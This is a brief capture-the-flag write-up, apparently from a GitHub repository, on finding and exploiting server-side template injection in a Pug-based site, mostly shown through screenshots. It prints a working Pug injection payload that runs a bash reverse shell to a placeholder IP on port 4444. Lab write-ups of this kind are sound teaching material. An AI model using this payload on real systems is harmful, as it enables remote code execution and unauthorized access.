First, we need to find out what a pug is. So, Pug is a template engine that helps us break down HTML code into smaller parts that we can reuse across multiple HTML files.

Given the description of this room containing SSTI, I will test the scripts to see if they work, thereby confirming the vulnerability occurring on this website.

<img width="2558" height="1359" alt="image" src="https://github.com/user-attachments/assets/57b95a69-3dea-46fc-89db-6e04f54fe247" />

<img width="2558" height="1359" alt="image" src="https://github.com/user-attachments/assets/1525f016-be1c-4141-a184-af2a6318b496" />

Next, we'll look for the version of this backend.

<img width="2558" height="1359" alt="image" src="https://github.com/user-attachments/assets/c2d4a7d7-b7e3-401d-af67-84519e4bd82c" />

<img width="2558" height="1359" alt="image" src="https://github.com/user-attachments/assets/e160eaf6-55fa-4788-bf43-20150787e5a0" />

I'll try to RCE with this script: #{global.process.mainModule.require('child_process').execSync('bash -c "bash -i >& /dev/tcp/YOUR_IP/4444 0>&1"')}

<img width="2558" height="1359" alt="image" src="https://github.com/user-attachments/assets/d12874b9-5501-4bd1-8da0-4492c3c9e1d7" />

we did itttt, flag is here lol





